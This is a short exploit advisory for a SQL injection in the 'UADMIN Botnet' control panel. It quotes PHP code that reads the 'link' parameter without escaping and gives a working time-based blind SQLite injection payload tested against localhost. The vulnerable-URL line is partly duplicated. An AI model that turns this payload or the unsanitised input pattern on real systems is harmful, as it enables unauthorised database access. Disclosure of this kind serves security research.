

Type: SQL Injection Vulnerability

Vuln: http://localhost/ush/gates/token.php?link=1/ush/gates/token.php?link=1

Author: n4pst3r

```
################################
# Exploit Title: UADMIN Botnet - SQL Injection Vulnerability
# Exploit Author: n4pst3r
# Vendor Homepage: unkn0wn
# Software Link: unkn0wn
# Version: unkn0wn
# Tested on: Windows 10, Kali
# CVE : n/a
################################
# Vuln-Code: download.php

$link=$_GET['link'];
$agent=esc__($_SERVER['HTTP_USER_AGENT']);

if(isset($_GET['botid'])){
    $botid=esc__($_GET['botid']);
}else{
  $botid='unknown';
};

################################
Attack Response & PoC:

---
Parameter: link (GET)
    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: link=1' OR 7990=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- nwGY
---

http://127.0.0.1/ush/gates/token.php?link=1
```
